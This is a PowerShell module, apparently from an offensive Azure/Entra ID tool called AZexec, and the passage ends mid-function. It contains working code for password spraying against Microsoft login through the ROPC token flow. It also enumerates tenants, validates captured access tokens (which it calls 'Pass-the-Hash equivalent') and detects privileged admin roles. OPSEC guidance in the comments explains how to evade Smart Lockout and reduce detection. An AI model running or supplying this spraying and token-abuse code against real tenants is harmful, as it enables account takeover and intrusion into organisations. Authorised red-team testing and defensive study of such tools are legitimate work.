# AZexec - Guest Authentication and Vulnerability Functions
# These functions are loaded into the main script scope via dot-sourcing

# ============================================
# PRIVILEGED ROLE DETECTION (NetExec Pwn3d! equivalent)
# ============================================
# Azure privileged role template IDs and their display names
$script:PrivilegedRoleMapping = @{
    "62e90394-69f5-4237-9190-012177145e10" = @{ Name = "Global Administrator"; Display = "GlobalAdmin!"; Risk = "CRITICAL" }
    "e8611ab8-c189-46e8-94e1-60213ab1f814" = @{ Name = "Privileged Role Administrator"; Display = "PrivRoleAdmin!"; Risk = "CRITICAL" }
    "194ae4cb-b126-40b2-bd5b-6091b380977d" = @{ Name = "Security Administrator"; Display = "SecurityAdmin!"; Risk = "HIGH" }
    "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3" = @{ Name = "Application Administrator"; Display = "AppAdmin!"; Risk = "HIGH" }
    "c4e39bd9-1100-46d3-8c65-fb160da0071f" = @{ Name = "Authentication Administrator"; Display = "AuthAdmin!"; Risk = "HIGH" }
    "b0f54661-2d74-4c50-afa3-1ec803f12efe" = @{ Name = "Privileged Authentication Administrator"; Display = "PrivAuthAdmin!"; Risk = "CRITICAL" }
    "729827e3-9c14-49f7-bb1b-9608f156bbb8" = @{ Name = "User Administrator"; Display = "UserAdmin!"; Risk = "MEDIUM" }
    "7be44c8a-adaf-4e2a-84d6-ab2649e08a13" = @{ Name = "Helpdesk Administrator"; Display = "HelpdeskAdmin!"; Risk = "MEDIUM" }
    "fe930be7-5e62-47db-91af-98c3a49a38b1" = @{ Name = "Exchange Administrator"; Display = "ExchangeAdmin!"; Risk = "MEDIUM" }
    "f28a1f50-f6e7-4571-818b-6a12f2af6b6c" = @{ Name = "SharePoint Administrator"; Display = "SharePointAdmin!"; Risk = "MEDIUM" }
    "158c047a-c907-4556-b7ef-446551a6b5f7" = @{ Name = "Cloud Application Administrator"; Display = "CloudAppAdmin!"; Risk = "HIGH" }
    "b1be1c3e-b65d-4f19-8427-f6fa0d97feb9" = @{ Name = "Conditional Access Administrator"; Display = "CAAdmin!"; Risk = "HIGH" }
    "966707d0-3269-4727-9be2-8c3a10f19b9d" = @{ Name = "Password Administrator"; Display = "PasswordAdmin!"; Risk = "MEDIUM" }
    "fdd7a751-b60b-444a-984c-02652fe8fa1c" = @{ Name = "Groups Administrator"; Display = "GroupsAdmin!"; Risk = "MEDIUM" }
    "11648597-926c-4cf3-9c36-bcebb0ba8dcc" = @{ Name = "Power Platform Administrator"; Display = "PowerPlatformAdmin!"; Risk = "MEDIUM" }
    "69091246-20e8-4a56-aa4d-066075b2a7a8" = @{ Name = "Teams Administrator"; Display = "TeamsAdmin!"; Risk = "MEDIUM" }
    "892c5842-a9a6-463a-8041-72aa08ca3cf6" = @{ Name = "Cloud Device Administrator"; Display = "CloudDeviceAdmin!"; Risk = "MEDIUM" }
    "7698a772-787b-4ac8-901f-60d6b08affd2" = @{ Name = "Intune Administrator"; Display = "IntuneAdmin!"; Risk = "HIGH" }
}

# ============================================
# JWT TOKEN PARSING (for Access Token auth)
# ============================================
function ConvertFrom-JwtToken {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Token
    )

    try {
        # Split the JWT into its parts
        $parts = $Token.Split('.')
        if ($parts.Count -ne 3) {
            return @{ Success = $false; Error = "Invalid JWT format - expected 3 parts" }
        }

        # Decode the payload (second part)
        $payload = $parts[1]

        # Add padding if needed (Base64 requires length divisible by 4)
        $paddingLength = 4 - ($payload.Length % 4)
        if ($paddingLength -ne 4) {
            $payload += '=' * $paddingLength
        }

        # Replace URL-safe characters
        $payload = $payload.Replace('-', '+').Replace('_', '/')

        # Decode from Base64
        $bytes = [System.Convert]::FromBase64String($payload)
        $json = [System.Text.Encoding]::UTF8.GetString($bytes)
        $claims = $json | ConvertFrom-Json

        # Extract useful claims
        $result = @{
            Success = $true
            Claims = $claims
            Username = $null
            TenantId = $null
            AppId = $null
            Audience = $null
            ExpiresAt = $null
            IsExpired = $false
        }

        # Common claim names for user identity
        if ($claims.upn) { $result.Username = $claims.upn }
        elseif ($claims.unique_name) { $result.Username = $claims.unique_name }
        elseif ($claims.preferred_username) { $result.Username = $claims.preferred_username }
        elseif ($claims.email) { $result.Username = $claims.email }

        # Tenant ID
        if ($claims.tid) { $result.TenantId = $claims.tid }

        # App ID
        if ($claims.appid) { $result.AppId = $claims.appid }
        elseif ($claims.azp) { $result.AppId = $claims.azp }

        # Audience
        if ($claims.aud) { $result.Audience = $claims.aud }

        # Expiration
        if ($claims.exp) {
            $result.ExpiresAt = (Get-Date "1970-01-01 00:00:00").AddSeconds($claims.exp)
            $result.IsExpired = $result.ExpiresAt -lt (Get-Date)
        }

        return $result
    }
    catch {
        return @{ Success = $false; Error = $_.Exception.Message }
    }
}

# ============================================
# PRIVILEGE LEVEL DETECTION
# ============================================
# Query Graph API for user's role assignments and return highest privilege level
# This is the Azure equivalent of checking if a user is "Domain Admin" (Pwn3d!)
function Get-UserPrivilegeLevel {
    param(
        [Parameter(Mandatory = $true)]
        [string]$AccessToken,

        [Parameter(Mandatory = $false)]
        [string]$UserId = "me"  # "me" for current user or specific user ID
    )

    $result = @{
        Success = $false
        PrivilegeLevel = $null
        PrivilegeDisplay = $null
        Risk = $null
        Roles = @()
        Error = $null
    }

    try {
        # Build headers for Graph API request
        $headers = @{
            "Authorization" = "Bearer $AccessToken"
            "Content-Type" = "application/json"
        }

        # Query user's directory role memberships
        # Using transitiveMemberOf to catch nested group-based role assignments
        $uri = "https://graph.microsoft.com/v1.0/$UserId/transitiveMemberOf/microsoft.graph.directoryRole"

        try {
            $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get -ErrorAction Stop
            $roles = $response.value
        }
        catch {
            # If transitiveMemberOf fails (e.g., for service principals), try memberOf
            try {
                $uri = "https://graph.microsoft.com/v1.0/$UserId/memberOf/microsoft.graph.directoryRole"
                $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get -ErrorAction Stop
                $roles = $response.value
            }
            catch {
                # If both fail, the token might not have required scopes
                $result.Error = "Could not query role memberships. Token may lack RoleManagement.Read.Directory or Directory.Read.All scope."
                return $result
            }
        }

        if (-not $roles -or $roles.Count -eq 0) {
            $result.Success = $true
            $result.PrivilegeLevel = $null
            $result.PrivilegeDisplay = $null
            return $result
        }

        # Check each role against our privileged role mapping
        $highestRisk = $null
        $highestDisplay = $null
        $riskOrder = @{ "CRITICAL" = 3; "HIGH" = 2; "MEDIUM" = 1 }

        foreach ($role in $roles) {
            $roleTemplateId = $role.roleTemplateId

            if ($script:PrivilegedRoleMapping.ContainsKey($roleTemplateId)) {
                $roleInfo = $script:PrivilegedRoleMapping[$roleTemplateId]
                $result.Roles += @{
                    Name = $roleInfo.Name
                    Display = $roleInfo.Display
                    Risk = $roleInfo.Risk
                    RoleTemplateId = $roleTemplateId
                }

                # Track highest privilege
                $currentRiskLevel = $riskOrder[$roleInfo.Risk]
                $highestRiskLevel = if ($highestRisk) { $riskOrder[$highestRisk] } else { 0 }

                if ($currentRiskLevel -gt $highestRiskLevel) {
                    $highestRisk = $roleInfo.Risk
                    $highestDisplay = $roleInfo.Display
                }
            }
        }

        $result.Success = $true
        $result.PrivilegeLevel = $highestRisk
        $result.PrivilegeDisplay = $highestDisplay
        $result.Risk = $highestRisk

    }
    catch {
        $result.Error = $_.Exception.Message
    }

    return $result
}

# ============================================
# TOKEN-BASED AUTHENTICATION
# ============================================
# Validate an access token and optionally query for privilege level
function Test-AccessTokenAuthentication {
    param(
        [Parameter(Mandatory = $true)]
        [string]$AccessToken,

        [Parameter(Mandatory = $false)]
        [switch]$CheckPrivileges
    )

    $result = [PSCustomObject]@{
        Success = $false
        Username = $null
        TenantId = $null
        TokenValid = $false
        TokenExpired = $false
        PrivilegeLevel = $null
        PrivilegeDisplay = $null
        Roles = @()
        Error = $null
    }

    # Parse the JWT token
    $tokenInfo = ConvertFrom-JwtToken -Token $AccessToken

    if (-not $tokenInfo.Success) {
        $result.Error = "Failed to parse access token: $($tokenInfo.Error)"
        return $result
    }

    $result.Username = $tokenInfo.Username
    $result.TenantId = $tokenInfo.TenantId

    # Check if token is expired
    if ($tokenInfo.IsExpired) {
        $result.TokenExpired = $true
        $result.Error = "Access token has expired (expired at $($tokenInfo.ExpiresAt))"
        return $result
    }

    # Validate token by making a simple Graph API call
    try {
        $headers = @{
            "Authorization" = "Bearer $AccessToken"
            "Content-Type" = "application/json"
        }

        $response = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers -Method Get -ErrorAction Stop
        $result.TokenValid = $true
        $result.Success = $true

        # Update username from Graph response if available
        if ($response.userPrincipalName) {
            $result.Username = $response.userPrincipalName
        }
    }
    catch {
        $result.Error = "Token validation failed: $($_.Exception.Message)"
        return $result
    }

    # Check privileges if requested
    if ($CheckPrivileges) {
        $privResult = Get-UserPrivilegeLevel -AccessToken $AccessToken
        if ($privResult.Success) {
            $result.PrivilegeLevel = $privResult.PrivilegeLevel
            $result.PrivilegeDisplay = $privResult.PrivilegeDisplay
            $result.Roles = $privResult.Roles
        }
    }

    return $result
}

# ============================================
# OPSEC WARNINGS DISPLAY
# ============================================
# Show OPSEC warnings before password spray attacks
function Show-SprayOPSECWarnings {
    param(
        [int]$UserCount,
        [int]$PasswordCount,
        [int]$Delay,
        [bool]$ContinueOnSuccess,
        [bool]$NoBruteforce
    )

    Write-ColorOutput -Message "" -Color "Yellow"
    Write-ColorOutput -Message "[!] ============================================" -Color "Red"
    Write-ColorOutput -Message "[!] OPSEC WARNING - PASSWORD SPRAY ATTACK" -Color "Red"
    Write-ColorOutput -Message "[!] ============================================" -Color "Red"
    Write-ColorOutput -Message "" -Color "Yellow"

    # Calculate total attempts
    $totalAttempts = if ($NoBruteforce) {
        [Math]::Min($UserCount, $PasswordCount)
    } else {
        $UserCount * $PasswordCount
    }

    Write-ColorOutput -Message "[*] Attack Configuration:" -Color "Yellow"
    Write-ColorOutput -Message "    Users to test:       $UserCount" -Color "Cyan"
    Write-ColorOutput -Message "    Passwords to test:   $PasswordCount" -Color "Cyan"
    Write-ColorOutput -Message "    Total attempts:      $totalAttempts" -Color "Cyan"
    Write-ColorOutput -Message "    Attack mode:         $(if ($NoBruteforce) { 'Linear pairing (user1:pass1, user2:pass2)' } else { 'Matrix (all combinations)' })" -Color "Cyan"
    Write-ColorOutput -Message "    Delay between rounds: $(if ($Delay -gt 0) { "$Delay seconds" } else { 'None (RISKY!)' })" -Color $(if ($Delay -gt 0) { "Cyan" } else { "Yellow" })
    Write-ColorOutput -Message "    Continue on success: $(if ($ContinueOnSuccess) { 'Yes' } else { 'No (stop on first valid creds)' })" -Color "Cyan"

    Write-ColorOutput -Message "" -Color "Yellow"
    Write-ColorOutput -Message "[*] Azure AD Smart Lockout Information:" -Color "Yellow"
    Write-ColorOutput -Message "    Default threshold:   ~10 failed attempts per user" -Color "DarkGray"
    Write-ColorOutput -Message "    Lockout duration:    60 seconds (increases with attempts)" -Color "DarkGray"
    Write-ColorOutput -Message "    Familiar locations:  May have higher threshold" -Color "DarkGray"

    if ($Delay -eq 0 -and $PasswordCount -gt 1) {
        Write-ColorOutput -Message "" -Color "Yellow"
        Write-ColorOutput -Message "[!] WARNING: No delay configured between password rounds!" -Color "Red"
        Write-ColorOutput -Message "[!] Consider using -Delay 1800 (30 min) to avoid lockouts" -Color "Yellow"
    }

    if (-not $NoBruteforce -and $PasswordCount -gt 3) {
        Write-ColorOutput -Message "" -Color "Yellow"
        Write-ColorOutput -Message "[!] WARNING: Matrix mode with $PasswordCount passwords!" -Color "Yellow"
        Write-ColorOutput -Message "[!] This will test $totalAttempts combinations - high detection risk" -Color "Yellow"
    }

    Write-ColorOutput -Message "" -Color "Yellow"
}

# ============================================
# PASSWORD SPRAY WRAPPER FUNCTION
# ============================================
# Dedicated spray command (NetExec-style: nxc smb -u users.txt -p 'Pass')
function Invoke-PasswordSpray {
    param(
        [string]$Domain,
        [string]$UserFile,
        [string]$Password,
        [string]$PasswordFile,
        [bool]$ContinueOnSuccess = $false,
        [bool]$NoBruteforce = $false,
        [int]$Delay = 0,
        [string]$ExportPath
    )

    Write-ColorOutput -Message "`n[*] AZX - Password Spray Attack" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: spray (Similar to: nxc smb -u users.txt -p 'Pass')" -Color "Yellow"

    # Validate required parameters
    if (-not $UserFile) {
        Write-ColorOutput -Message "[!] Error: -UserFile is required for spray command" -Color "Red"
        Write-ColorOutput -Message "[*] Usage: .\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass123'" -Color "Yellow"
        Write-ColorOutput -Message "[*] Usage: .\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt" -Color "Yellow"
        return
    }

    if (-not $Password -and -not $PasswordFile) {
        Write-ColorOutput -Message "[!] Error: Either -Password or -PasswordFile is required" -Color "Red"
        Write-ColorOutput -Message "[*] Usage: .\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass123'" -Color "Yellow"
        return
    }

    # Call the enhanced guest enumeration with spray parameters
    Invoke-GuestEnumeration -Domain $Domain -UserFile $UserFile -Password $Password -PasswordFile $PasswordFile -ContinueOnSuccess $ContinueOnSuccess -NoBruteforce $NoBruteforce -Delay $Delay -ExportPath $ExportPath -SprayMode $true
}

function Test-GuestLoginEnabled {
    param(
        [string]$Domain
    )
    
    $result = [PSCustomObject]@{
        Domain = $Domain
        TenantExists = $false
        AcceptsExternalUsers = $false
        FederationType = "Unknown"
        AuthUrl = $null
        CloudInstanceName = $null
        NameSpaceType = $null
        DomainName = $null
        IsFederated = $false
        ThrottleStatus = $null
        Error = $null
    }
    
    try {
        # Method 1: Use GetCredentialType to check if external users are accepted
        # This checks what happens when we try to authenticate with an email from this domain
        $testEmail = "guesttest_$([guid]::NewGuid().ToString().Substring(0,8))@$Domain"
        
        $body = @{
            username = $testEmail
            isOtherIdpSupported = $true
            checkPhones = $false
            isRemoteNGCSupported = $true
            isCookieBannerShown = $false
            isFidoSupported = $true
            forceotclogin = $false
            otclogindisallowed = $false
            isExternalFederationDisallowed = $false
            isRemoteConnectSupported = $false
            federationFlags = 0
            isSignup = $false
            flowToken = ""
        } | ConvertTo-Json
        
        $response = Invoke-RestMethod `
            -Method POST `
            -Uri "https://login.microsoftonline.com/common/GetCredentialType" `
            -ContentType "application/json" `
            -Body $body `
            -ErrorAction Stop
        
        $result.TenantExists = $true
        $result.ThrottleStatus = $response.ThrottleStatus
        
        # Check if federation/external identity is supported
        if ($response.EstsProperties) {
            if ($response.EstsProperties.DomainType) {
                $result.NameSpaceType = $response.EstsProperties.DomainType
            }
        }
        
        # Check credentials type - this tells us about federation
        if ($response.Credentials) {
            if ($response.Credentials.FederationRedirectUrl) {
                $result.IsFederated = $true
                $result.AuthUrl = $response.Credentials.FederationRedirectUrl
            }
        }
        
        # Method 2: Check OpenID config for more details
        $openIdUrl = "https://login.microsoftonline.com/$Domain/.well-known/openid-configuration"
        try {
            $openIdConfig = Invoke-RestMethod -Uri $openIdUrl -Method Get -ErrorAction Stop
            
            if ($openIdConfig.issuer) {
                $result.TenantExists = $true
                
                if ($openIdConfig.tenant_region_scope) {
                    $result.CloudInstanceName = $openIdConfig.tenant_region_scope
                }
            }
        } catch {
            # OpenID might not be accessible for all tenants
        }
        
        # Method 3: Check realm discovery endpoint for B2B settings
        $realmUrl = "https://login.microsoftonline.com/common/userrealm/$testEmail`?api-version=2.0"
        try {
            $realmInfo = Invoke-RestMethod -Uri $realmUrl -Method Get -ErrorAction Stop
            
            if ($realmInfo) {
                $result.NameSpaceType = $realmInfo.NameSpaceType
                $result.DomainName = $realmInfo.DomainName
                $result.FederationType = $realmInfo.FederationBrandName
                $result.AuthUrl = $realmInfo.AuthUrl
                
                if ($realmInfo.NameSpaceType -eq "Managed") {
                    $result.IsFederated = $false
                    $result.AcceptsExternalUsers = $true  # Managed domains typically accept B2B
                } elseif ($realmInfo.NameSpaceType -eq "Federated") {
                    $result.IsFederated = $true
                    $result.AcceptsExternalUsers = $true  # Federated domains also support B2B
                } elseif ($realmInfo.NameSpaceType -eq "Unknown") {
                    # Unknown namespace might indicate external users are not accepted
                    $result.AcceptsExternalUsers = $false
                }
            }
        } catch {
            # Realm might not be accessible
        }
        
    } catch {
        $result.Error = $_.Exception.Message
        
        if ($_.Exception.Response.StatusCode -eq 400) {
            $result.TenantExists = $false
        }
    }
    
    return $result
}

# Test guest authentication with credentials (password spray style)
# ============================================
# PASSWORD SPRAY ATTACK - PHASE 2
# ============================================
# This function is Phase 2 of the password spray attack workflow
#
# FUNCTION: Test-GuestAuthentication
# PURPOSE: Validate username/password combinations using ROPC OAuth2 flow
# USAGE: Called by 'guest' command (.\azx.ps1 guest -UserFile users.txt -Password 'Pass123')
#
# HOW IT WORKS:
#   - Uses Resource Owner Password Credentials (ROPC) grant type
#   - Sends username/password directly to Azure Entra ID token endpoint
#   - Returns detailed authentication result including:
#     * Success/failure status
#     * MFA requirements (valid creds even if MFA blocks)
#     * Account lockout detection
#     * Password expiration detection
#     * Access token (if successful)
#
# DETECTION & OPSEC:
#   - Generates Azure Entra ID sign-in logs (failed authentication events)
#   - Multiple failed attempts may trigger account lockout
#   - Use delays between attempts (100ms default)
#   - Respect lockout thresholds (typically 5-10 failed attempts)
#   - For low-noise: spray 1 password per day across all users
#
# NETEXEC EQUIVALENT:
#   nxc smb 192.168.1.0/24 -u users.txt -p 'Password123'
#   .\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Password123'
#
# ERROR CODES:
#   - AADSTS50126: Invalid username or password
#   - AADSTS50053: Account locked (too many failed attempts)
#   - AADSTS50055: Password expired
#   - AADSTS50076/50079: MFA required (credentials ARE VALID!)
#   - AADSTS65001: Consent required (credentials ARE VALID!)
#   - AADSTS50034: User not found
#   - AADSTS7000218: ROPC flow disabled
#
# IMPORTANT: If MFA or Consent is required, credentials are VALID but additional
#           steps are needed. These results should be treated as successful
#           credential validation for password spray purposes.
#
# ============================================
function Test-GuestAuthentication {
    param(
        [string]$Username,
        [string]$Password,
        [string]$TenantId = "common"
    )
    
    $result = [PSCustomObject]@{
        Username = $Username
        Success = $false
        ErrorCode = $null
        ErrorDescription = $null
        TokenType = $null
        AccessToken = $null
        MFARequired = $false
        AccountLocked = $false
        PasswordExpired = $false
        ConsentRequired = $false
    }
    
    try {
        # Use Resource Owner Password Credential (ROPC) flow to test credentials
        # Using Azure PowerShell client ID (known public client)
        $clientId = "1950a258-227b-4e31-a9cf-717495945fc2"  # Azure PowerShell
        $scope = "https://graph.microsoft.com/.default openid profile offline_access"
        
        $body = @{
            grant_type = "password"
            client_id = $clientId
            scope = $scope
            username = $Username
            password = $Password
        }
        
        $tokenUrl = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
        
        $response = Invoke-RestMethod `
            -Method POST `
            -Uri $tokenUrl `
            -ContentType "application/x-www-form-urlencoded" `
            -Body $body `
            -ErrorAction Stop
        
        $result.Success = $true
        $result.TokenType = $response.token_type
        $result.AccessToken = $response.access_token
        
    } catch {
        $errorResponse = $null

        try {
            # Try PowerShell 7+ method first (ErrorDetails.Message)
            if ($_.ErrorDetails.Message) {
                $errorResponse = $_.ErrorDetails.Message | ConvertFrom-Json
            }
            # Fall back to PowerShell 5.1 method (Response stream)
            elseif ($_.Exception.Response) {
                $reader = [System.IO.StreamReader]::new($_.Exception.Response.GetResponseStream())
                $errorBody = $reader.ReadToEnd()
                $reader.Close()
                $errorResponse = $errorBody | ConvertFrom-Json
            }
        } catch {
            # Couldn't parse error response
        }

        if ($errorResponse) {
            $result.ErrorCode = $errorResponse.error
            $result.ErrorDescription = $errorResponse.error_description
            
            # Analyze error codes
            switch -Regex ($errorResponse.error_description) {
                "AADSTS50126" {
                    # Invalid username or password
                    $result.ErrorCode = "INVALID_CREDENTIALS"
                }
                "AADSTS50053" {
                    # Account locked
                    $result.AccountLocked = $true
                    $result.ErrorCode = "ACCOUNT_LOCKED"
                }
                "AADSTS50055" {
                    # Password expired
                    $result.PasswordExpired = $true
                    $result.ErrorCode = "PASSWORD_EXPIRED"
                }
                "AADSTS50076|AADSTS50079" {
                    # MFA required - credential is valid!
                    $result.MFARequired = $true
                    $result.Success = $true  # Credentials are valid, just need MFA
                    $result.ErrorCode = "MFA_REQUIRED"
                }
                "AADSTS65001" {
                    # Consent required
                    $result.ConsentRequired = $true
                    $result.Success = $true  # Credentials are valid
                    $result.ErrorCode = "CONSENT_REQUIRED"
                }
                "AADSTS50034" {
                    # User not found
                    $result.ErrorCode = "USER_NOT_FOUND"
                }
                "AADSTS50057" {
                    # Account disabled
                    $result.ErrorCode = "ACCOUNT_DISABLED"
                }
                "AADSTS50058" {
                    # Silent sign-in failed
                    $result.ErrorCode = "SILENT_SIGNIN_FAILED"
                }
                "AADSTS700016" {
                    # Application not found in tenant
                    $result.ErrorCode = "APP_NOT_FOUND"
                }
                "AADSTS7000218" {
                    # ROPC not allowed
                    $result.ErrorCode = "ROPC_DISABLED"
                }
                default {
                    $result.ErrorCode = $errorResponse.error
                }
            }
        } else {
            $result.ErrorDescription = $_.Exception.Message
        }
    }
    
    return $result
}


function Invoke-GuestEnumeration {
    param(
        [string]$Domain,
        [string]$Username,
        [string]$Password,
        [string]$UserFile,
        [string]$PasswordFile,
        [bool]$ContinueOnSuccess = $false,
        [bool]$NoBruteforce = $false,
        [int]$Delay = 0,
        [string]$ExportPath,
        [bool]$SprayMode = $false,
        [string]$AccessToken  # Token-based auth (Azure's Pass-the-Hash equivalent)
    )

    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Guest Login Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Guest Enumeration (Similar to: nxc smb -u 'a' -p '')" -Color "Yellow"

    # ============================================
    # TOKEN-BASED AUTHENTICATION (Pass-the-Hash equivalent)
    # ============================================
    if ($AccessToken) {
        Write-ColorOutput -Message "[*] Mode: Access Token Authentication (Pass-the-Hash equivalent)" -Color "Cyan"
        Write-ColorOutput -Message "[*] Validating and testing provided access token...`n" -Color "Yellow"

        # Test the access token
        $tokenResult = Test-AccessTokenAuthentication -AccessToken $AccessToken -CheckPrivileges

        if (-not $tokenResult.Success) {
            if ($tokenResult.TokenExpired) {
                Write-ColorOutput -Message ("AZR".PadRight(12) + "token".PadRight(35) + "443".PadRight(7) + "[!] TOKEN EXPIRED - $($tokenResult.Error)") -Color "Red"
            } else {
                Write-ColorOutput -Message ("AZR".PadRight(12) + "token".PadRight(35) + "443".PadRight(7) + "[-] INVALID TOKEN - $($tokenResult.Error)") -Color "Red"
            }
            return
        }

        # Token is valid - display result with privilege indicator
        $displayUser = if ($tokenResult.Username) { $tokenResult.Username } else { "unknown" }
        if ($displayUser.Length -gt 35) {
            $displayUser = $displayUser.Substring(0, 32) + "..."
        }

        $displayDomain = if ($tokenResult.TenantId) { $tokenResult.TenantId } else { "unknown" }
        if ($displayDomain.Length -gt 35) {
            $displayDomain = $displayDomain.Substring(0, 32) + "..."
        }

        # Build output message with privilege indicator
        $privIndicator = ""
        $outputColor = "Green"
        if ($tokenResult.PrivilegeDisplay) {
            $privIndicator = " ($($tokenResult.PrivilegeDisplay))"
            $outputColor = if ($tokenResult.PrivilegeLevel -eq "CRITICAL") { "Red" } elseif ($tokenResult.PrivilegeLevel -eq "HIGH") { "Yellow" } else { "Green" }
        }

        Write-ColorOutput -Message ("AZR".PadRight(12) + $displayDomain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + "[+] SUCCESS! Token validated$privIndicator") -Color $outputColor

        # Show all privileged roles if any
        if ($tokenResult.Roles -and $tokenResult.Roles.Count -gt 0) {
            Write-ColorOutput -Message "" -Color "White"
            Write-ColorOutput -Message "[*] Privileged Roles Detected:" -Color "Yellow"
            foreach ($role in $tokenResult.Roles) {
                $roleColor = switch ($role.Risk) {
                    "CRITICAL" { "Red" }
                    "HIGH" { "Yellow" }
                    default { "Cyan" }
                }
                Write-ColorOutput -Message "    [$($role.Risk)] $($role.Name)" -Color $roleColor
            }
        }

        # Export if requested
        if ($ExportPath) {
            try {
                $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
                $exportData = [PSCustomObject]@{
                    AuthMethod = "AccessToken"
                    Username = $tokenResult.Username
                    TenantId = $tokenResult.TenantId
                    Success = $true
                    PrivilegeLevel = $tokenResult.PrivilegeLevel
                    PrivilegeDisplay = $tokenResult.PrivilegeDisplay
                    Roles = $tokenResult.Roles
                    Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                }

                if ($extension -eq ".csv") {
                    $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                } else {
                    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                }
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } catch {
                Write-ColorOutput -Message "[!] Failed to export results: $_" -Color "Red"
            }
        }

        Write-ColorOutput -Message "`n[*] Token authentication complete!" -Color "Green"
        Write-ColorOutput -Message "[*] You can now use this token for further enumeration:" -Color "Cyan"
        Write-ColorOutput -Message "    - Set as environment variable: `$env:AZURE_ACCESS_TOKEN = `"<token>`"" -Color "DarkGray"
        Write-ColorOutput -Message "    - Use with Graph API: Invoke-RestMethod -Headers @{Authorization='Bearer <token>'}" -Color "DarkGray"
        return
    }
    
    # Auto-detect domain if not provided
    if (-not $Domain) {
        Write-ColorOutput -Message "[*] No domain specified, attempting to auto-detect..." -Color "Yellow"
        
        $detectedDomain = $null
        
        # Method 1: Try to extract from username if provided
        if ($Username -and $Username -like "*@*") {
            $detectedDomain = ($Username -split "@")[1]
            Write-ColorOutput -Message "[+] Detected domain from username: $detectedDomain" -Color "Green"
        }

        # Method 2: Extract from first user in UserFile that has @domain
        if (-not $detectedDomain -and $UserFile -and (Test-Path $UserFile)) {
            try {
                $firstLines = Get-Content $UserFile -TotalCount 20 -ErrorAction SilentlyContinue
                foreach ($line in $firstLines) {
                    $line = $line.Trim()
                    if ($line -and $line -notlike "#*" -and $line -like "*@*") {
                        # Handle username:password format
                        if ($line -like "*:*") {
                            $emailPart = ($line -split ":", 2)[0].Trim()
                        } else {
                            $emailPart = $line
                        }
                        $detectedDomain = ($emailPart -split "@")[1]
                        if ($detectedDomain) {
                            Write-ColorOutput -Message "[+] Detected domain from user file: $detectedDomain" -Color "Green"
                            break
                        }
                    }
                }
            } catch {
                # Silent - will fall through to other methods
            }
        }

        # Method 3: Try to get UPN from whoami command (Windows)
        if (-not $detectedDomain) {
            try {
                if ($IsWindows -or $PSVersionTable.PSVersion.Major -le 5) {
                    $upn = whoami /upn 2>$null
                    if ($upn -and $upn -match '@(.+)$') {
                        $detectedDomain = $matches[1]
                        Write-ColorOutput -Message "[+] Detected domain from UPN: $detectedDomain" -Color "Green"
                    }
                }
            } catch {
                # Silent catch
            }
        }
        
        # Method 4: Try environment variable for USERDNSDOMAIN
        if (-not $detectedDomain) {
            $envDomain = [System.Environment]::GetEnvironmentVariable("USERDNSDOMAIN")
            if ($envDomain) {
                $detectedDomain = $envDomain
                Write-ColorOutput -Message "[+] Detected domain from environment: $detectedDomain" -Color "Green"
            }
        }
        
        if ($detectedDomain) {
            $Domain = $detectedDomain
            Write-ColorOutput -Message "[+] Using auto-detected domain: $Domain`n" -Color "Green"
        } else {
            Write-ColorOutput -Message "[!] Could not auto-detect domain" -Color "Red"
            Write-ColorOutput -Message "[!] Please provide the domain using: -Domain example.com" -Color "Yellow"
            Write-ColorOutput -Message "[!] Or provide a full email username: -Username user@example.com" -Color "Yellow"
            return
        }
    }
    
    Write-ColorOutput -Message "[*] Target Domain: $Domain" -Color "Yellow"
    Write-ColorOutput -Message "[*] Method: ROPC Authentication Testing`n" -Color "Yellow"
    
    # Phase 1: Check if tenant accepts external/guest authentication (unauthenticated)
    Write-ColorOutput -Message "[*] Phase 1: Checking tenant guest configuration (unauthenticated)..." -Color "Yellow"
    
    $guestConfig = Test-GuestLoginEnabled -Domain $Domain
    
    # Format output like nxc
    if ($guestConfig.TenantExists) {
        Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[+] Tenant exists") -Color "Green"
        
        if ($guestConfig.NameSpaceType) {
            $nsColor = if ($guestConfig.NameSpaceType -eq "Managed") { "Cyan" } else { "Yellow" }
            Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] NameSpaceType: $($guestConfig.NameSpaceType)") -Color $nsColor
        }
        
        if ($guestConfig.IsFederated) {
            Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Federation: Enabled ($($guestConfig.FederationType))") -Color "Yellow"
            if ($guestConfig.AuthUrl) {
                Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Auth URL: $($guestConfig.AuthUrl)") -Color "DarkGray"
            }
        } else {
            Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Federation: Managed (Cloud-only)") -Color "Cyan"
        }
        
        if ($guestConfig.AcceptsExternalUsers) {
            Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[+] External/Guest users: Likely ENABLED (B2B)") -Color "Green"
        }
    } else {
        Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[-] Tenant not found or not accessible") -Color "Red"
        return
    }
    
    Write-ColorOutput -Message ""
    
    # Phase 2: Test authentication if credentials provided
    if ($Username -or $UserFile) {
        Write-ColorOutput -Message "[*] Phase 2: Testing guest authentication..." -Color "Yellow"

